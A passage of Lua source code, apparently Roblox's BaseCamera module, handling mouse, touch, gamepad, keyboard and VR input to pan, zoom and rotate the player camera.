			self:OnPointerAction(wheel, pan, pinch, processed)
		end)
	
		self.inputBeganConn = UserInputService.InputBegan:Connect(function(input, processed)
			self:OnInputBegan(input, processed)
		end)
	
		self.inputChangedConn = UserInputService.InputChanged:Connect(function(input, processed)
			self:OnInputChanged(input, processed)
		end)
	
		self.inputEndedConn = UserInputService.InputEnded:Connect(function(input, processed)
			self:OnInputEnded(input, processed)
		end)
	
		self.menuOpenedConn = GuiService.MenuOpened:connect(function()
			self:ResetInputStates()
		end)
	
		self.gamepadConnectedConn = UserInputService.GamepadDisconnected:connect(function(gamepadEnum)
			if self.activeGamepad ~= gamepadEnum then return end
			self.activeGamepad = nil
			self:AssignActivateGamepad()
		end)
	
		self.gamepadDisconnectedConn = UserInputService.GamepadConnected:connect(function(gamepadEnum)
			if self.activeGamepad == nil then
				self:AssignActivateGamepad()
			end
		end)
	
		self:AssignActivateGamepad()
		if not FFlagUserCameraToggle then
			self:UpdateMouseBehavior()
		end
	end
	
	function BaseCamera:BindContextActions()
		self:BindGamepadInputActions()
		self:BindKeyboardInputActions()
	end
	
	function BaseCamera:AssignActivateGamepad()
		local connectedGamepads = UserInputService:GetConnectedGamepads()
		if #connectedGamepads > 0 then
			for i = 1, #connectedGamepads do
				if self.activeGamepad == nil then
					self.activeGamepad = connectedGamepads[i]
				elseif connectedGamepads[i].Value < self.activeGamepad.Value then
					self.activeGamepad = connectedGamepads[i]
				end
			end
		end
	
		if self.activeGamepad == nil then -- nothing is connected, at least set up for gamepad1
			self.activeGamepad = Enum.UserInputType.Gamepad1
		end
	end
	
	function BaseCamera:DisconnectInputEvents()
		if self.inputBeganConn then
			self.inputBeganConn:Disconnect()
			self.inputBeganConn = nil
		end
		if self.inputChangedConn then
			self.inputChangedConn:Disconnect()
			self.inputChangedConn = nil
		end
		if self.inputEndedConn then
			self.inputEndedConn:Disconnect()
			self.inputEndedConn = nil
		end
	end
	
	function BaseCamera:UnbindContextActions()
		for i = 1, #self.boundContextActions do
			ContextActionService:UnbindAction(self.boundContextActions[i])
		end
		self.boundContextActions = {}
	end
	
	function BaseCamera:Cleanup()
		if self.pointerActionConn then
			self.pointerActionConn:Disconnect()
			self.pointerActionConn = nil
		end
		if self.menuOpenedConn then
			self.menuOpenedConn:Disconnect()
			self.menuOpenedConn = nil
		end
		if self.mouseLockToggleConn then
			self.mouseLockToggleConn:Disconnect()
			self.mouseLockToggleConn = nil
		end
		if self.gamepadConnectedConn then
			self.gamepadConnectedConn:Disconnect()
			self.gamepadConnectedConn = nil
		end
		if self.gamepadDisconnectedConn then
			self.gamepadDisconnectedConn:Disconnect()
			self.gamepadDisconnectedConn = nil
		end
		if self.subjectStateChangedConn then
			self.subjectStateChangedConn:Disconnect()
			self.subjectStateChangedConn = nil
		end
		if self.viewportSizeChangedConn then
			self.viewportSizeChangedConn:Disconnect()
			self.viewportSizeChangedConn = nil
		end
		if self.touchActivateConn then
			self.touchActivateConn:Disconnect()
			self.touchActivateConn = nil
		end
	
		self.turningLeft = false
		self.turningRight = false
		self.lastCameraTransform = nil
		self.lastSubjectCFrame = nil
		self.userPanningTheCamera = false
		self.rotateInput = Vector2.new()
		self.gamepadPanningCamera = Vector2.new(0,0)
	
		-- Reset input states
		self.startPos = nil
		self.lastPos = nil
		self.panBeginLook = nil
		self.isRightMouseDown = false
		self.isMiddleMouseDown = false
	
		self.fingerTouches = {}
		self.dynamicTouchInput = nil
		self.numUnsunkTouches = 0
	
		self.startingDiff = nil
		self.pinchBeginZoom = nil
	
		-- Unlock mouse for example if right mouse button was being held down
		if UserInputService.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		end
	end
	
	-- This is called when settings menu is opened
	function BaseCamera:ResetInputStates()
		self.isRightMouseDown = false
		self.isMiddleMouseDown = false
		self:OnMousePanButtonReleased() -- this function doesn't seem to actually need parameters
	
		if UserInputService.TouchEnabled then
			--[[menu opening was causing serious touch issues
			this should disable all active touch events if
			they're active when menu opens.]]
			for inputObject in pairs(self.fingerTouches) do
				self.fingerTouches[inputObject] = nil
			end
			self.dynamicTouchInput = nil
			self.panBeginLook = nil
			self.startPos = nil
			self.lastPos = nil
			self.userPanningTheCamera = false
			self.startingDiff = nil
			self.pinchBeginZoom = nil
			self.numUnsunkTouches = 0
		end
	end
	
	function BaseCamera:GetGamepadPan(name, state, input)
		if input.UserInputType == self.activeGamepad and input.KeyCode == Enum.KeyCode.Thumbstick2 then
	--		if self.L3ButtonDown then
	--			-- L3 Thumbstick is depressed, right stick controls dolly in/out
	--			if (input.Position.Y > THUMBSTICK_DEADZONE) then
	--				self.currentZoomSpeed = 0.96
	--			elseif (input.Position.Y < -THUMBSTICK_DEADZONE) then
	--				self.currentZoomSpeed = 1.04
	--			else
	--				self.currentZoomSpeed = 1.00
	--			end
	--		else
				if state == Enum.UserInputState.Cancel then
					self.gamepadPanningCamera = ZERO_VECTOR2
					return
				end
	
				local inputVector = Vector2.new(input.Position.X, -input.Position.Y)
				if inputVector.magnitude > THUMBSTICK_DEADZONE then
					self.gamepadPanningCamera = Vector2.new(input.Position.X, -input.Position.Y)
				else
					self.gamepadPanningCamera = ZERO_VECTOR2
				end
			--end
			return Enum.ContextActionResult.Sink
		end
		return Enum.ContextActionResult.Pass
	end
	
	function BaseCamera:DoKeyboardPanTurn(name, state, input)
		if not self.hasGameLoaded and VRService.VREnabled then
			return Enum.ContextActionResult.Pass
		end
	
		if state == Enum.UserInputState.Cancel then
			self.turningLeft = false
			self.turningRight = false
			return Enum.ContextActionResult.Sink
		end
	
		if self.panBeginLook == nil and self.keyPanEnabled then
			if input.KeyCode == Enum.KeyCode.Left then
				self.turningLeft = state == Enum.UserInputState.Begin
			elseif input.KeyCode == Enum.KeyCode.Right then
				self.turningRight = state == Enum.UserInputState.Begin
			end
			return Enum.ContextActionResult.Sink
		end
		return Enum.ContextActionResult.Pass
	end
	
	function BaseCamera:DoPanRotateCamera(rotateAngle)
		local angle = Util.RotateVectorByAngleAndRound(self:GetCameraLookVector() * Vector3.new(1,0,1), rotateAngle, math.pi*0.25)
		if angle ~= 0 then
			self.rotateInput = self.rotateInput + Vector2.new(angle, 0)
			self.lastUserPanCamera = tick()
			self.lastCameraTransform = nil
		end
	end
	
	function BaseCamera:DoGamepadZoom(name, state, input)
		if input.UserInputType == self.activeGamepad then
			if input.KeyCode == Enum.KeyCode.ButtonR3 then
				if state == Enum.UserInputState.Begin then
					if self.distanceChangeEnabled then
						local dist = self:GetCameraToSubjectDistance()
	
						if dist > (GAMEPAD_ZOOM_STEP_2 + GAMEPAD_ZOOM_STEP_3)/2 then
							self:SetCameraToSubjectDistance(GAMEPAD_ZOOM_STEP_2)
						elseif dist > (GAMEPAD_ZOOM_STEP_1 + GAMEPAD_ZOOM_STEP_2)/2 then
							self:SetCameraToSubjectDistance(GAMEPAD_ZOOM_STEP_1)
						else
							self:SetCameraToSubjectDistance(GAMEPAD_ZOOM_STEP_3)
						end
					end
				end
			elseif input.KeyCode == Enum.KeyCode.DPadLeft then
				self.dpadLeftDown = (state == Enum.UserInputState.Begin)
			elseif input.KeyCode == Enum.KeyCode.DPadRight then
				self.dpadRightDown = (state == Enum.UserInputState.Begin)
			end
	
			if self.dpadLeftDown then
				self.currentZoomSpeed = 1.04
			elseif self.dpadRightDown then
				self.currentZoomSpeed = 0.96
			else
				self.currentZoomSpeed = 1.00
			end
			return Enum.ContextActionResult.Sink
		end
		return Enum.ContextActionResult.Pass
	--	elseif input.UserInputType == self.activeGamepad and input.KeyCode == Enum.KeyCode.ButtonL3 then
	--		if (state == Enum.UserInputState.Begin) then
	--			self.L3ButtonDown = true
	--		elseif (state == Enum.UserInputState.End) then
	--			self.L3ButtonDown = false
	--			self.currentZoomSpeed = 1.00
	--		end
	--	end
	end
	
	function BaseCamera:DoKeyboardZoom(name, state, input)
		if not self.hasGameLoaded and VRService.VREnabled then
			return Enum.ContextActionResult.Pass
		end
	
		if state ~= Enum.UserInputState.Begin then
			return Enum.ContextActionResult.Pass
		end
	
		if self.distanceChangeEnabled and player.CameraMode ~= Enum.CameraMode.LockFirstPerson then
			if input.KeyCode == Enum.KeyCode.I then
				self:SetCameraToSubjectDistance( self.currentSubjectDistance - 5 )
			elseif input.KeyCode == Enum.KeyCode.O then
				self:SetCameraToSubjectDistance( self.currentSubjectDistance + 5 )
			end
			return Enum.ContextActionResult.Sink
		end
		return Enum.ContextActionResult.Pass
	end
	
	function BaseCamera:BindAction(actionName, actionFunc, createTouchButton, ...)
		table.insert(self.boundContextActions, actionName)
		ContextActionService:BindActionAtPriority(actionName, actionFunc, createTouchButton,
			CAMERA_ACTION_PRIORITY, ...)
	end
	
	function BaseCamera:BindGamepadInputActions()
		self:BindAction("BaseCameraGamepadPan", function(name, state, input) return self:GetGamepadPan(name, state, input) end,
			false, Enum.KeyCode.Thumbstick2)
		self:BindAction("BaseCameraGamepadZoom", function(name, state, input) return self:DoGamepadZoom(name, state, input) end,
			false, Enum.KeyCode.DPadLeft, Enum.KeyCode.DPadRight, Enum.KeyCode.ButtonR3)
	end
	
	function BaseCamera:BindKeyboardInputActions()
		self:BindAction("BaseCameraKeyboardPanArrowKeys", function(name, state, input) return self:DoKeyboardPanTurn(name, state, input) end,
			false, Enum.KeyCode.Left, Enum.KeyCode.Right)
		self:BindAction("BaseCameraKeyboardZoom", function(name, state, input) return self:DoKeyboardZoom(name, state, input) end,
			false, Enum.KeyCode.I, Enum.KeyCode.O)
	end
	
	local function isInDynamicThumbstickArea(input)
		local playerGui = player:FindFirstChildOfClass("PlayerGui")
		local touchGui = playerGui and playerGui:FindFirstChild("TouchGui")
		local touchFrame = touchGui and touchGui:FindFirstChild("TouchControlFrame")
		local thumbstickFrame = touchFrame and touchFrame:FindFirstChild("DynamicThumbstickFrame")
	
		if not thumbstickFrame then
			return false
		end
	
		local frameCornerTopLeft = thumbstickFrame.AbsolutePosition
		local frameCornerBottomRight = frameCornerTopLeft + thumbstickFrame.AbsoluteSize
		if input.Position.X >= frameCornerTopLeft.X and input.Position.Y >= frameCornerTopLeft.Y then
			if input.Position.X <= frameCornerBottomRight.X and input.Position.Y <= frameCornerBottomRight.Y then
				return true
			end
		end
	
		return false
	end
	
	---Adjusts the camera Y touch Sensitivity when moving away from the center and in the TOUCH_SENSITIVTY_ADJUST_AREA
	function BaseCamera:AdjustTouchSensitivity(delta, sensitivity)
		local cameraCFrame = game.Workspace.CurrentCamera and game.Workspace.CurrentCamera.CFrame
		if not cameraCFrame then
			return sensitivity
		end
		local currPitchAngle = cameraCFrame:ToEulerAnglesYXZ()
	
		local multiplierY = TOUCH_SENSITIVTY_ADJUST_MAX_Y
		if currPitchAngle > TOUCH_ADJUST_AREA_UP and delta.Y < 0 then
			local fractionAdjust = (currPitchAngle - TOUCH_ADJUST_AREA_UP)/(MAX_Y - TOUCH_ADJUST_AREA_UP)
			fractionAdjust = 1 - (1 - fractionAdjust)^3
			multiplierY = TOUCH_SENSITIVTY_ADJUST_MAX_Y - fractionAdjust * (
				TOUCH_SENSITIVTY_ADJUST_MAX_Y - TOUCH_SENSITIVTY_ADJUST_MIN_Y)
		elseif currPitchAngle < TOUCH_ADJUST_AREA_DOWN and delta.Y > 0 then
			local fractionAdjust = (currPitchAngle - TOUCH_ADJUST_AREA_DOWN)/(MIN_Y - TOUCH_ADJUST_AREA_DOWN)
			fractionAdjust = 1 - (1 - fractionAdjust)^3
			multiplierY = TOUCH_SENSITIVTY_ADJUST_MAX_Y - fractionAdjust * (
				TOUCH_SENSITIVTY_ADJUST_MAX_Y - TOUCH_SENSITIVTY_ADJUST_MIN_Y)
		end
	
		return Vector2.new(
			sensitivity.X,
			sensitivity.Y * multiplierY
		)
	end
	
	function BaseCamera:OnTouchBegan(input, processed)
		local canUseDynamicTouch = self.isDynamicThumbstickEnabled and not processed
		if canUseDynamicTouch then
			if self.dynamicTouchInput == nil and isInDynamicThumbstickArea(input) then
				-- First input in the dynamic thumbstick area should always be ignored for camera purposes
				-- Even if the dynamic thumbstick does not process it immediately
				self.dynamicTouchInput = input
				return
			end
			self.fingerTouches[input] = processed
			self.inputStartPositions[input] = input.Position
			self.inputStartTimes[input] = tick()
			self.numUnsunkTouches = self.numUnsunkTouches + 1
		end
	end
	
	function BaseCamera:OnTouchChanged(input, processed)
		if self.fingerTouches[input] == nil then
			if self.isDynamicThumbstickEnabled then
				return
			end
			self.fingerTouches[input] = processed
			if not processed then
				self.numUnsunkTouches = self.numUnsunkTouches + 1
			end
		end
	
		if self.numUnsunkTouches == 1 then
			if self.fingerTouches[input] == false then
				self.panBeginLook = self.panBeginLook or self:GetCameraLookVector()
				self.startPos = self.startPos or input.Position
				self.lastPos = self.lastPos or self.startPos
				self.userPanningTheCamera = true
	
				local delta = input.Position - self.lastPos
				delta = Vector2.new(delta.X, delta.Y * UserGameSettings:GetCameraYInvertValue())
				if self.panEnabled then
					local adjustedTouchSensitivity = TOUCH_SENSITIVTY
					self:AdjustTouchSensitivity(delta, TOUCH_SENSITIVTY)
	
					local desiredXYVector = self:InputTranslationToCameraAngleChange(delta, adjustedTouchSensitivity)
					self.rotateInput = self.rotateInput + desiredXYVector
				end
				self.lastPos = input.Position
			end
		else
			self.panBeginLook = nil
			self.startPos = nil
			self.lastPos = nil
			self.userPanningTheCamera = false
		end
		if self.numUnsunkTouches == 2 then
			local unsunkTouches = {}
			for touch, wasSunk in pairs(self.fingerTouches) do
				if not wasSunk then
					table.insert(unsunkTouches, touch)
				end
			end
			if #unsunkTouches == 2 then
				local difference = (unsunkTouches[1].Position - unsunkTouches[2].Position).magnitude
				if self.startingDiff and self.pinchBeginZoom then
					local scale = difference / math.max(0.01, self.startingDiff)
					local clampedScale = math.clamp(scale, 0.1, 10)
					if self.distanceChangeEnabled then
						self:SetCameraToSubjectDistance(self.pinchBeginZoom / clampedScale)
					end
				else
					self.startingDiff = difference
					self.pinchBeginZoom = self:GetCameraToSubjectDistance()
				end
			end
		else
			self.startingDiff = nil
			self.pinchBeginZoom = nil
		end
	end
	
	function BaseCamera:OnTouchEnded(input, processed)
		if input == self.dynamicTouchInput then
			self.dynamicTouchInput = nil
			return
		end
	
		if self.fingerTouches[input] == false then
			if self.numUnsunkTouches == 1 then
				self.panBeginLook = nil
				self.startPos = nil
				self.lastPos = nil
				self.userPanningTheCamera = false
			elseif self.numUnsunkTouches == 2 then
				self.startingDiff = nil
				self.pinchBeginZoom = nil
			end
		end
	
		if self.fingerTouches[input] ~= nil and self.fingerTouches[input] == false then
			self.numUnsunkTouches = self.numUnsunkTouches - 1
		end
		self.fingerTouches[input] = nil
		self.inputStartPositions[input] = nil
		self.inputStartTimes[input] = nil
	end
	
	function BaseCamera:OnMouse2Down(input, processed)
		if processed then return end
	
		self.isRightMouseDown = true
		self:OnMousePanButtonPressed(input, processed)
	end
	
	function BaseCamera:OnMouse2Up(input, processed)
		self.isRightMouseDown = false
		self:OnMousePanButtonReleased(input, processed)
	end
	
	function BaseCamera:OnMouse3Down(input, processed)
		if processed then return end
	
		self.isMiddleMouseDown = true
		self:OnMousePanButtonPressed(input, processed)
	end
	
	function BaseCamera:OnMouse3Up(input, processed)
		self.isMiddleMouseDown = false
		self:OnMousePanButtonReleased(input, processed)
	end
	
	function BaseCamera:OnMouseMoved(input, processed)
		if not self.hasGameLoaded and VRService.VREnabled then
			return
		end
	
		local inputDelta = input.Delta
		inputDelta = Vector2.new(inputDelta.X, inputDelta.Y * UserGameSettings:GetCameraYInvertValue())
	
		local isInputPanning = FFlagUserCameraToggle and CameraInput.getPanning()
		local isBeginLook = self.startPos and self.lastPos and self.panBeginLook
		local isPanning = isBeginLook or self.inFirstPerson or self.inMouseLockedMode or isInputPanning
	
		if self.panEnabled and isPanning then
			local desiredXYVector = self:InputTranslationToCameraAngleChange(inputDelta, MOUSE_SENSITIVITY)
			self.rotateInput = self.rotateInput + desiredXYVector
		end
	
		if self.startPos and self.lastPos and self.panBeginLook then
			self.lastPos = self.lastPos + input.Delta
		end
	end
	
	function BaseCamera:OnMousePanButtonPressed(input, processed)
		if processed then return end
		if not FFlagUserCameraToggle then
			self:UpdateMouseBehavior()
		end
		self.panBeginLook = self.panBeginLook or self:GetCameraLookVector()
		self.startPos = self.startPos or input.Position
		self.lastPos = self.lastPos or self.startPos
		self.userPanningTheCamera = true
	end
	
	function BaseCamera:OnMousePanButtonReleased(input, processed)
		if not FFlagUserCameraToggle then
			self:UpdateMouseBehavior()
		end
		if not (self.isRightMouseDown or self.isMiddleMouseDown) then
			self.panBeginLook = nil
			self.startPos = nil
			self.lastPos = nil
			self.userPanningTheCamera = false
		end
	end
	
	function BaseCamera:UpdateMouseBehavior()
		if FFlagUserCameraToggle and self.isCameraToggle then
			CameraUI.setCameraModeToastEnabled(true)
			CameraInput.enableCameraToggleInput()
			CameraToggleStateController(self.inFirstPerson)
		else
			if FFlagUserCameraToggle then
				CameraUI.setCameraModeToastEnabled(false)
				CameraInput.disableCameraToggleInput()
			end
			-- first time transition to first person mode or mouse-locked third person
			if self.inFirstPerson or self.inMouseLockedMode then
				--UserGameSettings.RotationType = Enum.RotationType.CameraRelative
				UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
			else
				UserGameSettings.RotationType = Enum.RotationType.MovementRelative
				if self.isRightMouseDown or self.isMiddleMouseDown then
					UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
				else
					UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				end
			end
		end
	end
	
	function BaseCamera:UpdateForDistancePropertyChange()
		-- Calling this setter with the current value will force checking that it is still
		-- in range after a change to the min/max distance limits
		self:SetCameraToSubjectDistance(self.currentSubjectDistance)
	end
	
	function BaseCamera:SetCameraToSubjectDistance(desiredSubjectDistance)
		local lastSubjectDistance = self.currentSubjectDistance
	
		-- By default, camera modules will respect LockFirstPerson and override the currentSubjectDistance with 0
		-- regardless of what Player.CameraMinZoomDistance is set to, so that first person can be made
		-- available by the developer without needing to allow players to mousewheel dolly into first person.
		-- Some modules will override this function to remove or change first-person capability.
		if player.CameraMode == Enum.CameraMode.LockFirstPerson then
			self.currentSubjectDistance = 0.5
			if not self.inFirstPerson then
				self:EnterFirstPerson()
			end
		else
			local newSubjectDistance = math.clamp(desiredSubjectDistance, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
			if newSubjectDistance < FIRST_PERSON_DISTANCE_THRESHOLD then
				self.currentSubjectDistance = 0.5
				if not self.inFirstPerson then
					self:EnterFirstPerson()
				end
			else
				self.currentSubjectDistance = newSubjectDistance
				if self.inFirstPerson then
					self:LeaveFirstPerson()
				end
			end
		end
	
		-- Pass target distance and zoom direction to the zoom controller
		ZoomController.SetZoomParameters(self.currentSubjectDistance, math.sign(desiredSubjectDistance - lastSubjectDistance))
	
		-- Returned only for convenience to the caller to know the outcome
		return self.currentSubjectDistance
	end
	
	function BaseCamera:SetCameraType( cameraType )
		--Used by derived classes
		self.cameraType = cameraType
	end
	
	function BaseCamera:GetCameraType()
		return self.cameraType
	end
	
	-- Movement mode standardized to Enum.ComputerCameraMovementMode values
	function BaseCamera:SetCameraMovementMode( cameraMovementMode )
		self.cameraMovementMode = cameraMovementMode
	end
	
	function BaseCamera:GetCameraMovementMode()
		return self.cameraMovementMode
	end
	
	function BaseCamera:SetIsMouseLocked(mouseLocked)
		self.inMouseLockedMode = mouseLocked
		if not FFlagUserCameraToggle then
			self:UpdateMouseBehavior()
		end
	end
	
	function BaseCamera:GetIsMouseLocked()
		return self.inMouseLockedMode
	end
	
	function BaseCamera:SetMouseLockOffset(offsetVector)
		self.mouseLockOffset = offsetVector
	end
	
	function BaseCamera:GetMouseLockOffset()
		return self.mouseLockOffset
	end
	
	function BaseCamera:InFirstPerson()
		return self.inFirstPerson
	end
	
	function BaseCamera:EnterFirstPerson()
		-- Overridden in ClassicCamera, the only module which supports FirstPerson
	end
	
	function BaseCamera:LeaveFirstPerson()
		-- Overridden in ClassicCamera, the only module which supports FirstPerson
	end
	
	-- Nominal distance, set by dollying in and out with the mouse wheel or equivalent, not measured distance
	function BaseCamera:GetCameraToSubjectDistance()
		return self.currentSubjectDistance
	end
	
	-- Actual measured distance to the camera Focus point, which may be needed in special circumstances, but should
	-- never be used as the starting point for updating the nominal camera-to-subject distance (self.currentSubjectDistance)
	-- since that is a desired target value set only by mouse wheel (or equivalent) input, PopperCam, and clamped to min max camera distance
	function BaseCamera:GetMeasuredDistanceToFocus()
		local camera = game.Workspace.CurrentCamera
		if camera then
			return (camera.CoordinateFrame.p - camera.Focus.p).magnitude
		end
		return nil
	end
	
	function BaseCamera:GetCameraLookVector()
		return game.Workspace.CurrentCamera and game.Workspace.CurrentCamera.CFrame.lookVector or UNIT_Z
	end
	
	-- Replacements for RootCamera:RotateCamera() which did not actually rotate the camera
	-- suppliedLookVector is not normally passed in, it's used only by Watch camera
	function BaseCamera:CalculateNewLookCFrame(suppliedLookVector)
		local currLookVector = suppliedLookVector or self:GetCameraLookVector()
		local currPitchAngle = math.asin(currLookVector.y)
		local yTheta = math.clamp(self.rotateInput.y, -MAX_Y + currPitchAngle, -MIN_Y + currPitchAngle)
		local constrainedRotateInput = Vector2.new(self.rotateInput.x, yTheta)
		local startCFrame = CFrame.new(ZERO_VECTOR3, currLookVector)
		local newLookCFrame = CFrame.Angles(0, -constrainedRotateInput.x, 0) * startCFrame * CFrame.Angles(-constrainedRotateInput.y,0,0)
		return newLookCFrame
	end
	function BaseCamera:CalculateNewLookVector(suppliedLookVector)
		local newLookCFrame = self:CalculateNewLookCFrame(suppliedLookVector)
		return newLookCFrame.lookVector
	end
	
	function BaseCamera:CalculateNewLookVectorVR()
		local subjectPosition = self:GetSubjectPosition()
		local vecToSubject = (subjectPosition - game.Workspace.CurrentCamera.CFrame.p)
		local currLookVector = (vecToSubject * X1_Y0_Z1).unit
		local vrRotateInput = Vector2.new(self.rotateInput.x, 0)
		local startCFrame = CFrame.new(ZERO_VECTOR3, currLookVector)
		local yawRotatedVector = (CFrame.Angles(0, -vrRotateInput.x, 0) * startCFrame * CFrame.Angles(-vrRotateInput.y,0,0)).lookVector
		return (yawRotatedVector * X1_Y0_Z1).unit
	end
	
	function BaseCamera:GetHumanoid()
		local character = player and player.Character
		if character then
			local resultHumanoid = self.humanoidCache[player]
			if resultHumanoid and resultHumanoid.Parent == character then
				return resultHumanoid
			else
				self.humanoidCache[player] = nil -- Bust Old Cache
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					self.humanoidCache[player] = humanoid
				end
				return humanoid
			end
		end
		return nil
	end
	
	function BaseCamera:GetHumanoidPartToFollow(humanoid, humanoidStateType)
		if humanoidStateType == Enum.HumanoidStateType.Dead then
			local character = humanoid.Parent
			if character then
				return character:FindFirstChild("Head") or humanoid.Torso
			else
				return humanoid.Torso
			end
		else
			return humanoid.Torso
		end
	end
	
	function BaseCamera:UpdateGamepad()
		local gamepadPan = self.gamepadPanningCamera
		if gamepadPan and (self.hasGameLoaded or not VRService.VREnabled) then
			gamepadPan = Util.GamepadLinearToCurve(gamepadPan)
			local currentTime = tick()
			if gamepadPan.X ~= 0 or gamepadPan.Y ~= 0 then
				self.userPanningTheCamera = true
			elseif gamepadPan == ZERO_VECTOR2 then
				self.lastThumbstickRotate = nil
				if self.lastThumbstickPos == ZERO_VECTOR2 then
					self.currentSpeed = 0
				end
			end
	
			local finalConstant = 0
	
			if self.lastThumbstickRotate then
				if VRService.VREnabled then
					self.currentSpeed = self.vrMaxSpeed
				else
					local elapsedTime = (currentTime - self.lastThumbstickRotate) * 10
					self.currentSpeed = self.currentSpeed + (self.maxSpeed * ((elapsedTime*elapsedTime)/self.numOfSeconds))
	
					if self.currentSpeed > self.maxSpeed then self.currentSpeed = self.maxSpeed end
	
					if self.lastVelocity then
						local velocity = (gamepadPan - self.lastThumbstickPos)/(currentTime - self.lastThumbstickRotate)
						local velocityDeltaMag = (velocity - self.lastVelocity).magnitude
	
						if velocityDeltaMag > 12 then
							self.currentSpeed = self.currentSpeed * (20/velocityDeltaMag)
							if self.currentSpeed > self.maxSpeed then self.currentSpeed = self.maxSpeed end
						end
					end
				end
	
				finalConstant = UserGameSettings.GamepadCameraSensitivity * self.currentSpeed
				self.lastVelocity = (gamepadPan - self.lastThumbstickPos)/(currentTime - self.lastThumbstickRotate)
			end
	
			self.lastThumbstickPos = gamepadPan
			self.lastThumbstickRotate = currentTime
	
			return Vector2.new( gamepadPan.X * finalConstant, gamepadPan.Y * finalConstant * self.ySensitivity * UserGameSettings:GetCameraYInvertValue())
		end
	
		return ZERO_VECTOR2
	end
	
	-- [[ VR Support Section ]] --
	
	function BaseCamera:ApplyVRTransform()
		if not VRService.VREnabled then
			return
		end
	
		--we only want this to happen in first person VR
		local rootJoint = self.humanoidRootPart and self.humanoidRootPart:FindFirstChild("RootJoint")
		if not rootJoint then
			return
		end
	
		local cameraSubject = game.Workspace.CurrentCamera.CameraSubject
		local isInVehicle = cameraSubject and cameraSubject:IsA("VehicleSeat")
	
		if self.inFirstPerson and not isInVehicle then
			local vrFrame = VRService:GetUserCFrame(Enum.UserCFrame.Head)
			local vrRotation = vrFrame - vrFrame.p
			rootJoint.C0 = CFrame.new(vrRotation:vectorToObjectSpace(vrFrame.p)) * CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
		else
			rootJoint.C0 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
		end
	end
	
	function BaseCamera:IsInFirstPerson()
		return self.inFirstPerson
	end
	
	function BaseCamera:ShouldUseVRRotation()
		if not VRService.VREnabled then
			return false
		end
	
		if not self.VRRotationIntensityAvailable and tick() - self.lastVRRotationIntensityCheckTime < 1 then
			return false
		end
	
		local success, vrRotationIntensity = pcall(function() return StarterGui:GetCore("VRRotationIntensity") end)
		self.VRRotationIntensityAvailable = success and vrRotationIntensity ~= nil
		self.lastVRRotationIntensityCheckTime = tick()
	
		self.shouldUseVRRotation = success and vrRotationIntensity ~= nil and vrRotationIntensity ~= "Smooth"
	
		return self.shouldUseVRRotation
	end
	
	function BaseCamera:GetVRRotationInput()
		local vrRotateSum = ZERO_VECTOR2
		local success, vrRotationIntensity = pcall(function() return StarterGui:GetCore("VRRotationIntensity") end)
	
		if not success then
			return
		end
	
		local vrGamepadRotation = self.GamepadPanningCamera or ZERO_VECTOR2
		local delayExpired = (tick() - self.lastVRRotationTime) >= self:GetRepeatDelayValue(vrRotationIntensity)
	
		if math.abs(vrGamepadRotation.x) >= self:GetActivateValue() then
			if (delayExpired or not self.vrRotateKeyCooldown[Enum.KeyCode.Thumbstick2]) then
				local sign = 1
				if vrGamepadRotation.x < 0 then
					sign = -1
				end
				vrRotateSum = vrRotateSum + self:GetRotateAmountValue(vrRotationIntensity) * sign
				self.vrRotateKeyCooldown[Enum.KeyCode.Thumbstick2] = true
			end
		elseif math.abs(vrGamepadRotation.x) < self:GetActivateValue() - 0.1 then
			self.vrRotateKeyCooldown[Enum.KeyCode.Thumbstick2] = nil
		end
		if self.turningLeft then
			if delayExpired or not self.vrRotateKeyCooldown[Enum.KeyCode.Left] then
				vrRotateSum = vrRotateSum - self:GetRotateAmountValue(vrRotationIntensity)
				self.vrRotateKeyCooldown[Enum.KeyCode.Left] = true
			end
		else
			self.vrRotateKeyCooldown[Enum.KeyCode.Left] = nil
		end
		if self.turningRight then
			if (delayExpired or not self.vrRotateKeyCooldown[Enum.KeyCode.Right]) then
				vrRotateSum = vrRotateSum + self:GetRotateAmountValue(vrRotationIntensity)
				self.vrRotateKeyCooldown[Enum.KeyCode.Right] = true
			end
		else
			self.vrRotateKeyCooldown[Enum.KeyCode.Right] = nil
		end
	
		if vrRotateSum ~= ZERO_VECTOR2 then
			self.lastVRRotationTime = tick()
		end
	
		return vrRotateSum
	end
	
	function BaseCamera:CancelCameraFreeze(keepConstraints)
		if not keepConstraints then
			self.cameraTranslationConstraints = Vector3.new(self.cameraTranslationConstraints.x, 1, self.cameraTranslationConstraints.z)
		end
		if self.cameraFrozen then
			self.trackingHumanoid = nil
			self.cameraFrozen = false
		end
	end
	
	function BaseCamera:StartCameraFreeze(subjectPosition, humanoidToTrack)
		if not self.cameraFrozen then
			self.humanoidJumpOrigin = subjectPosition
			self.trackingHumanoid = humanoidToTrack
			self.cameraTranslationConstraints = Vector3.new(self.cameraTranslationConstraints.x, 0, self.cameraTranslationConstraints.z)
			self.cameraFrozen = true
		end
	end
	
	function BaseCamera:OnNewCameraSubject()
		if self.subjectStateChangedConn then
			self.subjectStateChangedConn:Disconnect()
			self.subjectStateChangedConn = nil
		end
	
		local humanoid = workspace.CurrentCamera and workspace.CurrentCamera.CameraSubject
		if self.trackingHumanoid ~= humanoid then
			self:CancelCameraFreeze()
		end
		if humanoid and humanoid:IsA("Humanoid") then
			self.subjectStateChangedConn = humanoid.StateChanged:Connect(function(oldState, newState)
				if VRService.VREnabled and newState == Enum.HumanoidStateType.Jumping and not self.inFirstPerson then
					self:StartCameraFreeze(self:GetSubjectPosition(), humanoid)
				elseif newState ~= Enum.HumanoidStateType.Jumping and newState ~= Enum.HumanoidStateType.Freefall then
					self:CancelCameraFreeze(true)
				end
			end)
		end
	end
	
	function BaseCamera:GetVRFocus(subjectPosition, timeDelta)
		local lastFocus = self.LastCameraFocus or subjectPosition
		if not self.cameraFrozen then
			self.cameraTranslationConstraints = Vector3.new(self.cameraTranslationConstraints.x, math.min(1, self.cameraTranslationConstraints.y + 0.42 * timeDelta), self.cameraTranslationConstraints.z)
		end
	
		local newFocus
		if self.cameraFrozen and self.humanoidJumpOrigin and self.humanoidJumpOrigin.y > lastFocus.y then
